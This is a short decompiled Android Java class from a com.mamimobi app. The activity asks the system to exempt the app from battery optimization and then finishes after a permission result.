package com.mamimobi.activity;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import com.mamimobi.AccessService;
import defpackage.e;
import defpackage.f11;

/* JADX INFO: loaded from: classes.dex */
public class BatteryOptimizationActivity extends Activity {
    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            if (f11.c(this)) {
                new Handler().postDelayed(new e(5, this), 500L);
                return;
            }
            Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse("package:" + getPackageName()));
            intent.addFlags(268435456);
            intent.addFlags(1073741824);
            startActivityForResult(intent, 5002);
            String str = AccessService.V;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        finish();
    }
}
